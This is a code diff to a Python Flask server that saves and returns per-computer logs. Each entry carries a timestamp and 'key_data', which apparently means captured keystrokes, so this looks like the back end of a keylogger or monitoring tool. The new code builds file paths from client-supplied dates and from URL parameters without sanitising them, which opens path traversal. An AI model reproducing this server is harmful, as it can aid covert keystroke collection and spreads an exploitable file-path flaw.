@@ -19,16 +19,15 @@ os.makedirs(SAVE_DIR, exist_ok=True)  # Create directory if it doesn't exist
 def save_logs(computer_id, logs):
     """Saves logs to a file using the correct timestamps from the client."""
     try:
-        today_date = datetime.today().strftime("%Y-%m-%d")
-        computer_dir = os.path.join(SAVE_DIR, computer_id)
-        os.makedirs(computer_dir, exist_ok=True)
-        file_path = os.path.join(computer_dir, f"{today_date}.jsonl")
+        for log in logs:
+            today_date = log["datestamp"]  # 🔹 Utilisation de la date envoyée par le client
+            computer_dir = os.path.join(SAVE_DIR, computer_id)
+            os.makedirs(computer_dir, exist_ok=True)
+            file_path = os.path.join(computer_dir, f"{today_date}.jsonl")
 
-        with open(file_path, "a", encoding="utf-8") as f:
-            for log in logs:
-                # 🔹 Use the timestamp sent by the client
+            with open(file_path, "a", encoding="utf-8") as f:
                 log_entry = {
-                    "timestamp": log["timestamp"],  # Keep the correct timestamp
+                    "timestamp": log["timestamp"],  # Garder l'heure
                     "key_data": log["key_data"]
                 }
                 json.dump(log_entry, f)
@@ -39,6 +38,7 @@ def save_logs(computer_id, logs):
     except Exception as e:
         print(f"❌ Error saving logs: {e}")
         return False
+
 
 # ==============================
 # 🔹 Flask Routes
@@ -149,6 +149,31 @@ def login():
     except Exception as e:
         print(f"❌ Server error: {e}")
         return jsonify({"error": f"Server error: {e}"}), 500
+
+@app.route('/logs/<computer_id>/<date>', methods=['GET'])
+def get_logs_by_date(computer_id, date):
+    """Renvoie les logs d'un ordinateur pour une date spécifique."""
+    try:
+        computer_dir = os.path.join(SAVE_DIR, computer_id)
+        if not os.path.exists(computer_dir):
+            return jsonify({"error": "No logs found for this computer"}), 404
+
+        file_path = os.path.join(computer_dir, f"{date}.jsonl")
+        if not os.path.exists(file_path):
+            return jsonify({"error": "No logs found for this date"}), 404
+
+        logs = []
+        with open(file_path, "r", encoding="utf-8") as f:
+            for line in f:
+                logs.append(json.loads(line))
+
+        return jsonify(logs), 200
+
+    except Exception as e:
+        print(f"❌ Server error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 
 # ==============================
 # 🔹 Run Flask Application
